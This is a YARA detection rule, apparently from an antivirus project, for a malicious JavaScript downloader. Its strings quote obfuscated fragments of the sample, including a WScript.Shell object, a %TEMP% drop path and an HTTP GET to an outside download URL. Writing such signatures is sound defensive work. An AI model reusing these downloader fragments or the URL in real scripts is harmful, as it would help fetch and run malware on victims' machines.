rule sig_20160427_04fd1941f12d76c6b5c6b291bc0338e7 {
  meta:
    description = "datamaliciousorder - file 20160427_04fd1941f12d76c6b5c6b291bc0338e7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b8c6acab14c2d817f78f698fa542929453bd32a235003571b16108ceefca3344"

  strings:
    $s1  = "GpjlwQxrbi[XtxyjMjyem](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function LywymScbvq() {return JniekNomqf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BRVoSlE" ascii
    $s3  = "function LywymScbvq() {return JniekNomqf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"BRVoSlE" ascii
    $s4  = "function WslgrAwykm(RknisBesqq, FepjjJibjg){NwcekSngrg = NwcekSngrg * 1; return RknisBesqq - FepjjJibjg;};" fullword ascii
    $s5  = "var JniekNomqf = function XoljnMcxff() {return ZdbtcAiufw[TwnilBwgok](\"WScript\"+\".Shell\");}(), EldeiWsyzg = 11;" fullword ascii
    $s6  = "function BmgewXymkj(){return LnpzqNjvtz + \"\";};" fullword ascii
    $s7  = "if (GpjlwQxrbi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function PjibqKmqip() {return ((HsxdkLpnxx == true) && (HsxdkLpnxx == NwlezLmbyk)) ? 1 : NwcekSngrg;};" fullword ascii
    $s9  = "var ZdbtcAiufw = this[\"WScript\"];" fullword ascii
    $s10 = "}while (LfervMcroe);" fullword ascii
    $s11 = "HsxdkLpnxx = true; " fullword ascii
    $s12 = "var PdauuVjqkv = false;" fullword ascii
    $s13 = "var VmlieLuaiv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function QsdwaXiruz(){return TwnilBwgok;};" fullword ascii
    $s15 = "PdauuVjqkv = true;" fullword ascii
    $s16 = "function VzsrcWvayn(){return 23;};" fullword ascii
    $s17 = "var HsxdkLpnxx = false;" fullword ascii
    $s18 = "function NkrmaAurbl()" fullword ascii
    $s19 = "return WslgrAwykm(ShunoAwqku, IveohGrvsn);" fullword ascii
    $s20 = "var NwlezLmbyk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}